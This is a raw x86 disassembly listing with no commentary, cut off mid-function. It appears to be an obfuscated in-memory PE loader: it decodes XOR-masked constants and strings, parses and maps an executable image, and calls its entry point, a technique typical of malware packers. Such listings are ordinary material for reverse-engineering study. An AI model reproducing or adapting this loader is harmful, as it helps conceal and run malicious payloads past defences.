  421a0b:	add    esi,edx
  421a0d:	cmp    edi,esi
  421a0f:	jne    0x421a19
  421a11:	mov    esi,DWORD PTR [ebp-0x20]
  421a14:	mov    edi,DWORD PTR [ebp-0x24]
  421a17:	add    DWORD PTR [esi],edi
  421a19:	add    ebx,0x2
  421a1c:	dec    DWORD PTR [ebp-0x18]
  421a1f:	jne    0x4219c0
  421a21:	mov    ebx,DWORD PTR [ebp-0xc]
  421a24:	add    DWORD PTR [ebp-0x8],ebx
  421a27:	mov    esi,DWORD PTR [ebp-0x1c]
  421a2a:	mov    edi,DWORD PTR [ebp-0x8]
  421a2d:	mov    ebx,DWORD PTR [ebp+0xc]
  421a30:	xor    esi,ecx
  421a32:	cmp    edi,DWORD PTR [ebx+esi*8+0x193984c]
  421a39:	jae    0x421a53
  421a3b:	add    eax,DWORD PTR [ebp-0xc]
  421a3e:	mov    esi,DWORD PTR [ebp-0x4]
  421a41:	mov    ebx,DWORD PTR [eax+0x4]
  421a44:	xor    esi,ecx
  421a46:	add    esi,edx
  421a48:	mov    DWORD PTR [ebp-0xc],ebx
  421a4b:	cmp    ebx,esi
  421a4d:	jne    0x4219a7
  421a53:	pop    ebx
  421a54:	mov    eax,DWORD PTR [ebp-0x28]
  421a57:	pop    edi
  421a58:	jmp    0x421a5d
  421a5a:	mov    eax,DWORD PTR [ebp-0x4]
  421a5d:	xor    eax,ecx
  421a5f:	add    eax,edx
  421a61:	pop    esi
  421a62:	leave  
  421a63:	ret    0x8
  421a66:	push   ebp
  421a67:	mov    ebp,esp
  421a69:	sub    esp,0xd8
  421a6f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  421a76:	mov    DWORD PTR [ebp-0x24],0xf89c85b4
  421a7d:	mov    eax,DWORD PTR [ebp-0x4]
  421a80:	push   ebx
  421a81:	push   esi
  421a82:	mov    esi,0x75108b3
  421a87:	xor    eax,esi
  421a89:	push   edi
  421a8a:	mov    edi,0x3272fa
  421a8f:	add    eax,edi
  421a91:	mov    DWORD PTR [ebp-0x18],eax
  421a94:	mov    eax,DWORD PTR [ebp-0x4]
  421a97:	xor    eax,esi
  421a99:	add    eax,edi
  421a9b:	mov    DWORD PTR [ebp-0x8],eax
  421a9e:	mov    ebx,DWORD PTR [ebp+0x20]
  421aa1:	mov    eax,DWORD PTR [ebp-0x1c]
  421aa4:	mov    ecx,DWORD PTR [ebp-0x1c]
  421aa7:	xor    eax,ecx
  421aa9:	mov    DWORD PTR [ebp-0x1c],eax
  421aac:	add    DWORD PTR [ebp-0x1c],0xf89cb5b5
  421ab3:	mov    eax,DWORD PTR [ebp-0xc]
  421ab6:	mov    ecx,DWORD PTR [ebp-0xc]
  421ab9:	xor    eax,ecx
  421abb:	mov    DWORD PTR [ebp-0xc],eax
  421abe:	add    DWORD PTR [ebp-0xc],0xf89c85f5
  421ac5:	mov    eax,DWORD PTR [ebp-0x10]
  421ac8:	mov    ecx,DWORD PTR [ebp-0x10]
  421acb:	xor    eax,ecx
  421acd:	mov    DWORD PTR [ebp-0x10],eax
  421ad0:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  421ad7:	mov    eax,DWORD PTR [ebp-0x28]
  421ada:	mov    ecx,DWORD PTR [ebp-0x28]
  421add:	xor    eax,ecx
  421adf:	mov    DWORD PTR [ebp-0x28],eax
  421ae2:	add    DWORD PTR [ebp-0x28],0xf89f05b5
  421ae9:	mov    DWORD PTR [ebp+0x20],0xf89cefe0
  421af0:	mov    eax,DWORD PTR [ebp+0x8]
  421af3:	test   eax,eax
  421af5:	je     0x421f7c
  421afb:	mov    eax,DWORD PTR [ebp+0xc]
  421afe:	test   eax,eax
  421b00:	je     0x421f7c
  421b06:	mov    eax,DWORD PTR [ebp+0x18]
  421b09:	test   eax,eax
  421b0b:	je     0x421f7c
  421b11:	mov    eax,DWORD PTR [ebp+0x20]
  421b14:	mov    ecx,DWORD PTR [ebp+0x8]
  421b17:	xor    eax,0x8b3
  421b1c:	add    eax,0x72fa
  421b21:	cmp    WORD PTR [ecx],ax
  421b24:	jne    0x421f7c
  421b2a:	mov    eax,DWORD PTR [ebp-0x4]
  421b2d:	xor    eax,esi
  421b2f:	add    eax,edi
  421b31:	mov    DWORD PTR [ebp-0x30],eax
  421b34:	mov    eax,DWORD PTR [ebp-0x4]
  421b37:	mov    ecx,DWORD PTR [ebp+0x8]
  421b3a:	mov    eax,DWORD PTR [ebp+0x8]
  421b3d:	add    eax,DWORD PTR [ecx+0x3c]
  421b40:	mov    DWORD PTR [ebp+0xc],eax
  421b43:	mov    eax,DWORD PTR [eax+0x50]
  421b46:	test   eax,eax
  421b48:	je     0x421f7c
  421b4e:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  421b55:	mov    eax,DWORD PTR [ebp-0x2c]
  421b58:	xor    eax,esi
  421b5a:	add    eax,edi
  421b5c:	mov    DWORD PTR [ebp-0x2c],eax
  421b5f:	mov    eax,DWORD PTR [ebp-0x4]
  421b62:	mov    eax,DWORD PTR [ebx+0x190]
  421b68:	mov    ecx,DWORD PTR [eax]
  421b6a:	mov    ecx,DWORD PTR [ecx+0x3c]
  421b6d:	add    ecx,DWORD PTR [eax]
  421b6f:	mov    eax,DWORD PTR [ebp-0x4]
  421b72:	mov    eax,DWORD PTR [ebx+0x18c]
  421b78:	mov    edx,DWORD PTR [eax]
  421b7a:	mov    DWORD PTR [ebp-0x20],ecx
  421b7d:	mov    DWORD PTR [ebp+0x20],edx
  421b80:	cmp    edx,edx
  421b82:	jne    0x421bb6
  421b84:	mov    eax,DWORD PTR [ebx+0x1e0]
  421b8a:	lea    edx,[ebp-0x18]
  421b8d:	push   edx
  421b8e:	mov    edx,DWORD PTR [ebp-0xc]
  421b91:	xor    edx,esi
  421b93:	add    edx,edi
  421b95:	push   edx
  421b96:	push   DWORD PTR [ecx+0x50]
  421b99:	push   DWORD PTR [ebp+0x20]
  421b9c:	call   DWORD PTR [eax+0x1c]
  421b9f:	mov    eax,DWORD PTR [ebp-0x20]
  421ba2:	mov    ecx,DWORD PTR [eax+0x54]
  421ba5:	mov    eax,DWORD PTR [eax+0x50]
  421ba8:	sub    eax,ecx
  421baa:	add    ecx,DWORD PTR [ebp+0x20]
  421bad:	push   ecx
  421bae:	call   0x422519
  421bb3:	mov    edx,DWORD PTR [ebp+0x20]
  421bb6:	mov    eax,DWORD PTR [ebx+0x194]
  421bbc:	mov    DWORD PTR [eax],edx
  421bbe:	mov    eax,DWORD PTR [ebp+0xc]
  421bc1:	push   DWORD PTR [eax+0x54]
  421bc4:	push   DWORD PTR [ebp+0x8]
  421bc7:	push   edx
  421bc8:	call   0x42240f
  421bcd:	mov    ecx,DWORD PTR [ebp+0x20]
  421bd0:	mov    eax,DWORD PTR [ecx+0x3c]
  421bd3:	add    eax,ecx
  421bd5:	movzx  ecx,WORD PTR [eax+0x14]
  421bd9:	lea    ecx,[ecx+eax*1+0x18]
  421bdd:	mov    DWORD PTR [ebp+0x18],ecx
  421be0:	mov    ecx,DWORD PTR [ebp-0x4]
  421be3:	movzx  edx,WORD PTR [eax+0x6]
  421be7:	xor    ecx,esi
  421be9:	add    ecx,edi
  421beb:	mov    DWORD PTR [ebp+0xc],eax
  421bee:	cmp    edx,ecx
  421bf0:	je     0x421c9d
  421bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  421bf9:	xor    ecx,esi
  421bfb:	add    ecx,edi
  421bfd:	mov    DWORD PTR [ebp-0x8],ecx
  421c00:	mov    ecx,DWORD PTR [ebp-0x24]
  421c03:	movzx  edx,WORD PTR [eax+0x6]
  421c07:	xor    ecx,esi
  421c09:	sub    edx,ecx
  421c0b:	sub    edx,edi
  421c0d:	cmp    DWORD PTR [ebp-0x8],edx
  421c10:	ja     0x421c9d
  421c16:	mov    edx,DWORD PTR [ebp+0x18]
  421c19:	add    edx,0x8
  421c1c:	mov    DWORD PTR [ebp+0x18],edx
  421c1f:	jmp    0x421c24
  421c21:	mov    edx,DWORD PTR [ebp+0x18]
  421c24:	mov    eax,DWORD PTR [eax+0x38]
  421c27:	lea    ecx,[eax-0x1]
  421c2a:	mov    DWORD PTR [ebp-0x38],eax
  421c2d:	mov    eax,DWORD PTR [edx]
  421c2f:	test   eax,ecx
  421c31:	je     0x421c3a
  421c33:	not    ecx
  421c35:	and    eax,ecx
  421c37:	add    eax,DWORD PTR [ebp-0x38]
  421c3a:	mov    ecx,DWORD PTR [edx+0x4]
  421c3d:	add    ecx,DWORD PTR [ebp+0x20]
  421c40:	push   ecx
  421c41:	call   0x422519
  421c46:	mov    edx,DWORD PTR [ebp-0x4]
  421c49:	mov    eax,DWORD PTR [ebp+0x18]
  421c4c:	mov    ecx,DWORD PTR [eax+0x8]
  421c4f:	xor    edx,esi
  421c51:	add    edx,edi
  421c53:	cmp    ecx,edx
  421c55:	je     0x421c6e
  421c57:	push   ecx
  421c58:	mov    ecx,DWORD PTR [ebp+0x8]
  421c5b:	add    ecx,DWORD PTR [eax+0xc]
  421c5e:	mov    eax,DWORD PTR [eax+0x4]
  421c61:	add    eax,DWORD PTR [ebp+0x20]
  421c64:	push   ecx
  421c65:	push   eax
  421c66:	call   0x42240f
  421c6b:	mov    eax,DWORD PTR [ebp+0x18]
  421c6e:	mov    ecx,DWORD PTR [ebp-0x24]
  421c71:	mov    edx,DWORD PTR [ebp-0x8]
  421c74:	add    eax,0x28
  421c77:	xor    ecx,esi
  421c79:	lea    ecx,[edx+ecx*1+0x3272fa]
  421c80:	mov    edx,DWORD PTR [ebp+0xc]
  421c83:	mov    DWORD PTR [ebp+0x18],eax
  421c86:	mov    eax,DWORD PTR [ebp-0x24]
  421c89:	movzx  edx,WORD PTR [edx+0x6]
  421c8d:	xor    eax,esi
  421c8f:	sub    edx,eax
  421c91:	mov    eax,DWORD PTR [ebp+0xc]
  421c94:	sub    edx,edi
  421c96:	mov    DWORD PTR [ebp-0x8],ecx
  421c99:	cmp    ecx,edx
  421c9b:	jbe    0x421c21
  421c9d:	mov    edx,DWORD PTR [ebx+0x18c]
  421ca3:	mov    ecx,DWORD PTR [ebp+0x20]
  421ca6:	cmp    ecx,DWORD PTR [edx]
  421ca8:	jne    0x421cd1
  421caa:	mov    eax,DWORD PTR [ebx+0x1e0]
  421cb0:	lea    edx,[ebp-0x18]
  421cb3:	push   edx
  421cb4:	mov    edx,DWORD PTR [ebp-0x10]
  421cb7:	xor    edx,esi
  421cb9:	add    edx,edi
  421cbb:	push   edx
  421cbc:	mov    edx,DWORD PTR [ebp-0x20]
  421cbf:	push   DWORD PTR [edx+0x54]
  421cc2:	push   ecx
  421cc3:	call   DWORD PTR [eax+0x1c]
  421cc6:	test   eax,eax
  421cc8:	je     0x421f6d
  421cce:	mov    eax,DWORD PTR [ebp+0xc]
  421cd1:	mov    ecx,DWORD PTR [ebx+0x1c8]
  421cd7:	mov    ecx,DWORD PTR [ecx]
  421cd9:	xor    ecx,esi
  421cdb:	add    ecx,edi
  421cdd:	je     0x421e98
  421ce3:	mov    eax,DWORD PTR [ebp-0x4]
  421ce6:	xor    eax,esi
  421ce8:	add    eax,edi
  421cea:	and    DWORD PTR [ebp+0x8],0x0
  421cee:	mov    DWORD PTR [ebp-0x14],eax
  421cf1:	mov    eax,0xf89c85d9
  421cf6:	lea    ecx,[eax-0x18]
  421cf9:	mov    DWORD PTR [ebp-0x58],0xf89c85c7
  421d00:	mov    DWORD PTR [ebp-0x54],0xf89c85c9
  421d07:	mov    DWORD PTR [ebp-0x50],eax
  421d0a:	mov    DWORD PTR [ebp-0x4c],ecx
  421d0d:	mov    DWORD PTR [ebp-0x48],ecx
  421d10:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  421d17:	mov    edx,DWORD PTR [ebp+0x8]
  421d1a:	mov    ecx,0x8b3
  421d1f:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  421d24:	mov    edx,0x72fa
  421d29:	add    cx,dx
  421d2c:	mov    edx,DWORD PTR [ebp+0x8]
  421d2f:	inc    DWORD PTR [ebp+0x8]
  421d32:	cmp    DWORD PTR [ebp+0x8],0x6
  421d36:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  421d3e:	jb     0x421d17
  421d40:	mov    ecx,0xf89c85cb
  421d45:	mov    DWORD PTR [ebp-0xb0],eax
  421d4b:	mov    DWORD PTR [ebp-0x9c],eax
  421d51:	mov    DWORD PTR [ebp-0x74],eax
  421d54:	mov    DWORD PTR [ebp-0x70],eax
  421d57:	lea    eax,[ecx-0x1]
  421d5a:	lea    edx,[ecx+0x34]
  421d5d:	mov    DWORD PTR [ebp-0x64],eax
  421d60:	mov    DWORD PTR [ebp-0x60],eax
  421d63:	mov    DWORD PTR [ebp-0xb4],0xf89c85e1
  421d6d:	mov    DWORD PTR [ebp-0xac],ecx
  421d73:	mov    DWORD PTR [ebp-0xa8],edx
  421d79:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  421d83:	mov    DWORD PTR [ebp-0xa0],0xf89c85c7
  421d8d:	mov    DWORD PTR [ebp-0x98],0xf89c85f8
  421d97:	mov    DWORD PTR [ebp-0x94],0xf89c85c7
  421da1:	mov    DWORD PTR [ebp-0x90],0xf89c85c9
  421dab:	mov    DWORD PTR [ebp-0x8c],ecx
  421db1:	mov    DWORD PTR [ebp-0x88],0xf89c85cc
  421dbb:	mov    DWORD PTR [ebp-0x84],edx
  421dc1:	mov    DWORD PTR [ebp-0x80],0xf89c85c6
  421dc8:	mov    DWORD PTR [ebp-0x7c],ecx
  421dcb:	mov    DWORD PTR [ebp-0x78],0xf89c85f4
  421dd2:	mov    DWORD PTR [ebp-0x6c],ecx
  421dd5:	mov    DWORD PTR [ebp-0x68],0xf89c85d8
  421ddc:	mov    DWORD PTR [ebp-0x5c],0xf89c85b5
  421de3:	xor    eax,eax
  421de5:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  421dec:	xor    cl,0xb3
  421def:	sub    cl,0x6
  421df2:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  421df9:	inc    eax
  421dfa:	cmp    eax,0x17
  421dfd:	jb     0x421de5
  421dff:	mov    eax,DWORD PTR [ebx+0x1e0]
  421e05:	lea    ecx,[ebp-0xc0]
  421e0b:	push   ecx
  421e0c:	call   DWORD PTR [eax+0x4]
  421e0f:	mov    ecx,DWORD PTR [ebx+0x1e0]
  421e15:	lea    edx,[ebp-0xd8]
  421e1b:	push   edx
  421e1c:	push   eax
  421e1d:	call   DWORD PTR [ecx+0x8]
  421e20:	mov    DWORD PTR [ebp-0x40],eax
  421e23:	lea    eax,[ebp-0x14]
  421e26:	push   eax
  421e27:	mov    eax,DWORD PTR [ebx+0x18c]
  421e2d:	push   DWORD PTR [eax]
  421e2f:	mov    eax,DWORD PTR [ebp-0x40]
  421e32:	call   eax
  421e34:	mov    eax,DWORD PTR [ebp-0x4]
  421e37:	xor    eax,esi
  421e39:	add    eax,edi
  421e3b:	mov    DWORD PTR [ebp-0x34],eax
  421e3e:	mov    ecx,DWORD PTR [ebp-0x4]
  421e41:	mov    eax,DWORD PTR [ebp-0x14]
  421e44:	xor    ecx,esi
  421e46:	add    ecx,edi
  421e48:	cmp    eax,ecx
  421e4a:	je     0x421e95
  421e4c:	mov    DWORD PTR [ebp-0x3c],eax
  421e4f:	jmp    0x421e60
  421e51:	mov    eax,DWORD PTR [eax]
  421e53:	mov    ecx,DWORD PTR [ebp-0x3c]
  421e56:	mov    DWORD PTR [ebp-0x14],eax
  421e59:	mov    eax,DWORD PTR [ebp-0x14]
  421e5c:	cmp    eax,ecx
  421e5e:	je     0x421e6d
  421e60:	mov    edx,DWORD PTR [eax+0x18]
  421e63:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e69:	cmp    edx,DWORD PTR [ecx]
  421e6b:	jne    0x421e51
  421e6d:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e73:	mov    edx,DWORD PTR [eax+0x18]
  421e76:	cmp    edx,DWORD PTR [ecx]
  421e78:	jne    0x421e95
  421e7a:	mov    ecx,DWORD PTR [ebx+0x190]
  421e80:	mov    edx,DWORD PTR [ebp-0x20]
  421e83:	mov    edx,DWORD PTR [edx+0x28]
  421e86:	add    edx,DWORD PTR [ecx]
  421e88:	mov    DWORD PTR [eax+0x1c],edx
  421e8b:	mov    eax,DWORD PTR [ebp-0x24]
  421e8e:	xor    eax,esi
  421e90:	add    eax,edi
  421e92:	mov    DWORD PTR [ebp-0x34],eax
  421e95:	mov    eax,DWORD PTR [ebp+0xc]
  421e98:	push   ebx
  421e99:	push   eax
  421e9a:	push   DWORD PTR [ebp+0x20]
  421e9d:	call   0x42161d
  421ea2:	test   eax,eax
  421ea4:	je     0x421f6d
  421eaa:	push   DWORD PTR [ebp+0xc]
  421ead:	mov    ecx,ebx
  421eaf:	push   DWORD PTR [ebp+0x20]
  421eb2:	call   0x421576
  421eb7:	test   eax,eax
  421eb9:	je     0x421f6d
  421ebf:	mov    eax,DWORD PTR [ebp+0xc]
  421ec2:	mov    edx,DWORD PTR [ebp+0x20]
  421ec5:	mov    ecx,ebx
  421ec7:	call   0x42144f
  421ecc:	test   eax,eax
  421ece:	je     0x421f6d
  421ed4:	push   ebx
  421ed5:	push   DWORD PTR [ebp+0x20]
  421ed8:	call   0x421900
  421edd:	test   eax,eax
  421edf:	je     0x421f6d
  421ee5:	mov    eax,DWORD PTR [ebx+0x18c]
  421eeb:	mov    edx,DWORD PTR [ebp+0x20]
  421eee:	cmp    edx,DWORD PTR [eax]
  421ef0:	jne    0x421f0c
  421ef2:	mov    eax,DWORD PTR [ebx+0x1e0]
  421ef8:	lea    ecx,[ebp-0x18]
  421efb:	push   ecx
  421efc:	push   DWORD PTR [ebp-0x18]
  421eff:	mov    ecx,DWORD PTR [ebp-0x20]
  421f02:	push   DWORD PTR [ecx+0x54]
  421f05:	push   edx
  421f06:	call   DWORD PTR [eax+0x1c]
  421f09:	mov    edx,DWORD PTR [ebp+0x20]
  421f0c:	mov    eax,DWORD PTR [ebx+0x1c8]
  421f12:	mov    eax,DWORD PTR [eax]
  421f14:	xor    eax,esi
  421f16:	add    eax,edi
  421f18:	je     0x421f51
  421f1a:	mov    ecx,DWORD PTR [ebp+0xc]
  421f1d:	mov    eax,DWORD PTR [ecx+0x28]
  421f20:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  421f27:	mov    esi,DWORD PTR [ebp+0x8]
  421f2a:	push   DWORD PTR [ebp+0x14]
  421f2d:	xor    esi,0x8b3
  421f33:	push   DWORD PTR [ebp+0x10]
  421f36:	add    esi,0x72fa
  421f3c:	or     WORD PTR [ecx+0x16],si
  421f40:	add    eax,edx
  421f42:	push   edx
  421f43:	call   eax
  421f45:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b4
  421f4f:	jmp    0x421f5b
  421f51:	mov    eax,DWORD PTR [ebp+0xc]
  421f54:	mov    eax,DWORD PTR [eax+0x28]
  421f57:	add    eax,edx
  421f59:	call   eax
  421f5b:	mov    DWORD PTR [ebp-0x8],eax
  421f5e:	mov    eax,DWORD PTR [ebp-0x8]
  421f61:	mov    ecx,DWORD PTR [ebp+0x1c]
  421f64:	mov    DWORD PTR [ecx],eax
  421f66:	mov    DWORD PTR [ebp-0x30],0x1
  421f6d:	cmp    DWORD PTR [ebp-0x30],0x0
  421f71:	jne    0x421f77
  421f73:	and    DWORD PTR [ebp+0x20],0x0
  421f77:	mov    eax,DWORD PTR [ebp+0x20]
  421f7a:	jmp    0x421f7e
  421f7c:	xor    eax,eax
  421f7e:	pop    edi
  421f7f:	pop    esi
  421f80:	pop    ebx
  421f81:	leave  
  421f82:	ret    0x1c
  421f85:	push   ebp
  421f86:	mov    ebp,esp
  421f88:	movzx  edx,WORD PTR [ecx+0x6]
  421f8c:	movzx  eax,WORD PTR [ecx+0x14]
  421f90:	push   ebx
  421f91:	push   edi
  421f92:	xor    edi,edi
  421f94:	lea    eax,[eax+ecx*1+0x18]
  421f98:	test   edx,edx
  421f9a:	je     0x421fbb
  421f9c:	mov    ecx,DWORD PTR [eax+0xc]
  421f9f:	lea    ebx,[ecx+esi*1]
  421fa2:	cmp    DWORD PTR [ebp+0x8],ebx
  421fa5:	jb     0x421fb3
  421fa7:	mov    ebx,DWORD PTR [eax+0x8]
  421faa:	add    ebx,ecx
  421fac:	add    ebx,esi
  421fae:	cmp    DWORD PTR [ebp+0x8],ebx
  421fb1:	jb     0x421fbd
  421fb3:	add    eax,0x28
  421fb6:	inc    edi
  421fb7:	cmp    edi,edx
  421fb9:	jb     0x421f9c
  421fbb:	xor    eax,eax
  421fbd:	pop    edi
  421fbe:	pop    ebx
  421fbf:	pop    ebp
  421fc0:	ret    0x4
  421fc3:	push   ebp
  421fc4:	mov    ebp,esp
  421fc6:	sub    esp,0x34
  421fc9:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  421fd0:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  421fd7:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  421fde:	mov    DWORD PTR [ebp-0x8],0xf89c85d4
  421fe5:	mov    DWORD PTR [ebp-0x20],0xf89c85f4
  421fec:	mov    DWORD PTR [ebp-0x2c],0xf89c8533
  421ff3:	mov    DWORD PTR [ebp-0x2c],0xf89c85d3
  421ffa:	mov    DWORD PTR [ebp-0x10],eax
  421ffd:	mov    eax,DWORD PTR [ebp+0x8]
  422000:	mov    DWORD PTR [ebp-0x14],eax
  422003:	mov    eax,DWORD PTR [ebp-0xc]
  422006:	push   ebx
  422007:	mov    ecx,0x75108b3
  42200c:	xor    eax,ecx
  42200e:	push   esi
  42200f:	mov    esi,DWORD PTR [ebp-0x10]
  422012:	mov    edx,0x3272fa
  422017:	add    eax,edx
  422019:	push   edi
  42201a:	cmp    esi,eax
  42201c:	je     0x4221fb
  422022:	mov    eax,DWORD PTR [ebp-0xc]
  422025:	mov    esi,DWORD PTR [ebp-0x14]
  422028:	xor    eax,ecx
  42202a:	add    eax,edx
  42202c:	cmp    esi,eax
  42202e:	je     0x4221fb
  422034:	mov    eax,DWORD PTR [ebp-0xc]
  422037:	xor    eax,ecx
  422039:	add    eax,edx
  42203b:	mov    DWORD PTR [ebp-0x24],eax
  42203e:	mov    eax,DWORD PTR [ebp-0xc]
  422041:	xor    eax,ecx
  422043:	add    eax,edx
  422045:	mov    DWORD PTR [ebp-0x28],eax
  422048:	mov    edi,DWORD PTR [ebp-0x20]
  42204b:	mov    ebx,DWORD PTR [ebp-0x8]
  42204e:	mov    esi,0x8b3
  422053:	xor    edi,esi
  422055:	mov    eax,0x72fa
  42205a:	xor    ebx,esi
  42205c:	add    edi,eax
  42205e:	add    ebx,eax
  422060:	sub    ebx,edi
  422062:	mov    WORD PTR [ebp-0x8],bx
  422066:	jmp    0x42212b
  42206b:	mov    edi,DWORD PTR [ebp-0xc]
  42206e:	mov    bx,WORD PTR [ebp-0x4]
  422072:	xor    edi,esi
  422074:	add    edi,eax
  422076:	cmp    bx,di
  422079:	je     0x42216d
  42207f:	mov    edi,DWORD PTR [ebp-0xc]
  422082:	mov    ebx,DWORD PTR [ebp+0xc]
  422085:	xor    edi,ecx
  422087:	add    edi,edx
  422089:	cmp    ebx,edi
  42208b:	mov    di,WORD PTR [ebp-0x4]
  42208f:	mov    bx,WORD PTR [ebp+0x8]
  422093:	je     0x4220fe
  422095:	cmp    bx,di
  422098:	je     0x422107
  42209a:	mov    edi,DWORD PTR [ebp-0x20]
  42209d:	mov    bx,WORD PTR [ebp+0x8]
  4220a1:	xor    edi,esi
  4220a3:	add    edi,eax
  4220a5:	cmp    bx,di
  4220a8:	jb     0x4220c8
  4220aa:	mov    edi,DWORD PTR [ebp-0x2c]
  4220ad:	mov    bx,WORD PTR [ebp+0x8]
  4220b1:	xor    edi,esi
  4220b3:	add    edi,eax
  4220b5:	cmp    bx,di
  4220b8:	ja     0x4220c8
  4220ba:	movzx  edi,WORD PTR [ebp+0x8]
  4220be:	movzx  ebx,WORD PTR [ebp-0x8]
  4220c2:	add    edi,ebx
  4220c4:	mov    WORD PTR [ebp+0x8],di
  4220c8:	mov    edi,DWORD PTR [ebp-0x20]
  4220cb:	mov    bx,WORD PTR [ebp-0x4]
  4220cf:	xor    edi,esi
  4220d1:	add    edi,eax
  4220d3:	cmp    bx,di
  4220d6:	jb     0x4220f6
  4220d8:	mov    edi,DWORD PTR [ebp-0x2c]
  4220db:	mov    bx,WORD PTR [ebp-0x4]
  4220df:	xor    edi,esi
  4220e1:	add    edi,eax
  4220e3:	cmp    bx,di
  4220e6:	ja     0x4220f6
  4220e8:	movzx  edi,WORD PTR [ebp-0x4]
  4220ec:	movzx  ebx,WORD PTR [ebp-0x8]
  4220f0:	add    edi,ebx
  4220f2:	mov    WORD PTR [ebp-0x4],di
  4220f6:	mov    di,WORD PTR [ebp-0x4]
  4220fa:	mov    bx,WORD PTR [ebp+0x8]
  4220fe:	cmp    bx,di
  422101:	jne    0x4221fb
  422107:	mov    edi,DWORD PTR [ebp-0x1c]
  42210a:	mov    ebx,DWORD PTR [ebp-0x10]
  42210d:	xor    edi,ecx
  42210f:	lea    edi,[edi+ebx*1+0x3272fa]
  422116:	mov    DWORD PTR [ebp-0x10],edi
  422119:	mov    edi,DWORD PTR [ebp-0x1c]
  42211c:	mov    ebx,DWORD PTR [ebp-0x14]
  42211f:	xor    edi,ecx
  422121:	lea    edi,[edi+ebx*1+0x3272fa]
  422128:	mov    DWORD PTR [ebp-0x14],edi
  42212b:	mov    edi,DWORD PTR [ebp-0x24]
  42212e:	mov    ebx,DWORD PTR [ebp-0x10]
  422131:	mov    di,WORD PTR [ebx+edi*2]
  422135:	mov    WORD PTR [ebp+0x8],di
  422139:	mov    edi,DWORD PTR [ebp-0x28]
  42213c:	mov    ebx,DWORD PTR [ebp-0x14]
  42213f:	mov    di,WORD PTR [ebx+edi*2]
  422143:	mov    WORD PTR [ebp-0x4],di
  422147:	mov    edi,DWORD PTR [ebp-0xc]
  42214a:	mov    bx,WORD PTR [ebp+0x8]
  42214e:	xor    edi,esi
  422150:	add    edi,eax
  422152:	cmp    bx,di
  422155:	jne    0x42206b
  42215b:	mov    eax,DWORD PTR [ebp-0x18]
  42215e:	mov    esi,DWORD PTR [ebp-0xc]
  422161:	xor    eax,ecx
  422163:	add    eax,edx
  422165:	imul   eax,esi
  422168:	mov    DWORD PTR [ebp-0xc],eax
  42216b:	jmp    0x42217f
  42216d:	mov    eax,DWORD PTR [ebp-0xc]
  422170:	mov    esi,DWORD PTR [ebp-0x18]
  422173:	xor    eax,ecx
  422175:	lea    eax,[eax+esi*1+0x3272fa]
  42217c:	mov    DWORD PTR [ebp-0x18],eax
  42217f:	mov    eax,DWORD PTR [ebp-0x24]
  422182:	sub    eax,edx
  422184:	xor    eax,ecx
  422186:	mov    DWORD PTR [ebp-0x30],eax
  422189:	mov    eax,DWORD PTR [ebp-0x28]
  42218c:	sub    eax,edx
  42218e:	xor    eax,ecx
  422190:	mov    DWORD PTR [ebp-0x34],eax
  422193:	mov    eax,DWORD PTR [ebp-0x34]
  422196:	mov    esi,DWORD PTR [ebp-0x1c]
  422199:	xor    esi,ecx
  42219b:	add    esi,edx
  42219d:	xor    eax,ecx
  42219f:	add    eax,0x3272fa
  4221a4:	imul   esi,eax
  4221a7:	mov    eax,DWORD PTR [ebp-0x14]
  4221aa:	movzx  eax,WORD PTR [esi+eax*1]
  4221ae:	mov    esi,DWORD PTR [ebp-0x30]
  4221b1:	mov    edi,DWORD PTR [ebp-0x1c]
  4221b4:	xor    esi,ecx
  4221b6:	add    esi,edx
  4221b8:	xor    edi,ecx
  4221ba:	add    edi,edx
  4221bc:	imul   edi,esi
  4221bf:	mov    esi,DWORD PTR [ebp-0x10]
  4221c2:	movzx  esi,WORD PTR [edi+esi*1]
  4221c6:	sub    eax,edx
  4221c8:	sub    esi,edx
  4221ca:	xor    eax,ecx
  4221cc:	xor    esi,ecx
  4221ce:	cmp    esi,eax
  4221d0:	jne    0x4221fb
  4221d2:	mov    eax,DWORD PTR [ebp-0x30]
  4221d5:	mov    esi,DWORD PTR [ebp-0x1c]
  4221d8:	xor    eax,ecx
  4221da:	add    eax,0x3272fa
  4221df:	xor    esi,ecx
  4221e1:	add    esi,edx
  4221e3:	imul   esi,eax
  4221e6:	mov    eax,DWORD PTR [ebp-0x10]
  4221e9:	movzx  eax,WORD PTR [esi+eax*1]
  4221ed:	mov    esi,DWORD PTR [ebp-0xc]
  4221f0:	sub    eax,edx
  4221f2:	xor    eax,ecx
  4221f4:	cmp    eax,esi
  4221f6:	mov    eax,DWORD PTR [ebp-0xc]
  4221f9:	je     0x4221fe
  4221fb:	mov    eax,DWORD PTR [ebp-0x18]
  4221fe:	pop    edi
  4221ff:	xor    eax,ecx
  422201:	pop    esi
  422202:	add    eax,edx
  422204:	pop    ebx
  422205:	leave  
  422206:	ret    0x8
  422209:	push   ebp
  42220a:	mov    ebp,esp
  42220c:	push   ecx
  42220d:	mov    cx,WORD PTR [eax]
  422210:	push   esi
  422211:	mov    esi,0x3b5f
  422216:	sub    cx,si
  422219:	mov    esi,0x8a9d
  42221e:	xor    cx,si
  422221:	mov    esi,0x4e3c
  422226:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42222d:	mov    edx,0xf89c85b5
  422232:	cmp    cx,si
  422235:	je     0x422294
  422237:	push   ebx
  422238:	push   edi
  422239:	movzx  ecx,cx
  42223c:	mov    edi,0xffcd8d06
  422241:	mov    esi,0x75108b3
  422246:	mov    ebx,0x4e60
  42224b:	cmp    cx,bx
  42224e:	jne    0x422253
  422250:	mov    DWORD PTR [ebp-0x4],edx
  422253:	lea    edx,[edi+0x1]
  422256:	xor    edx,esi
  422258:	mov    edi,edx
